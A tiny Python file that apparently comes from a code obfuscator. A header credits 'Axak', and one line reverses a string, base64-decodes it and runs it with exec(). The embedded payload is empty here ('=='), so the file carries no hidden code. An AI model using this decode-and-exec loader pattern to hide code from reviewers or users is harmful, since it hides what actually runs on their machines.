# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Tue Jun 14 14:36:03 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))